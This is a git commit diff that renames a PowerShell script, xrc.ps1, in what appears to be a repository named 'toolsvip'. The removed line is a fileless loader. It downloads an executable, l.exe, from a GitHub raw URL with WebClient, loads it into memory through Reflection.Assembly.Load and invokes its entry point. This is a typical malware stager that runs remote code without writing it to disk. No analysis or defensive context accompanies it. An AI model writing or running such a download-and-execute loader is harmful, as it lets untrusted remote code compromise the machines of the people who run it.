01c6e5741e2852dbe5d107869cfc5808a69548ee
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-06-09 22:47:37 -0300

    Update and rename xrc.ps1 to xrc2.ps1

--- xrc.ps1
+++
@@ -1,1 +0,0 @@
-$link="https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe";$webClient=New-Object System.Net.WebClient;$bytes=$webClient.DownloadData($link);$assembly=[System.Reflection.Assembly]::Load($bytes);$entry=$assembly.EntryPoint;if($entry.GetParameters().Count -eq 1){$entry.Invoke($null,@([string[]]@()))}else{$entry.Invoke($null,$null)};Pause
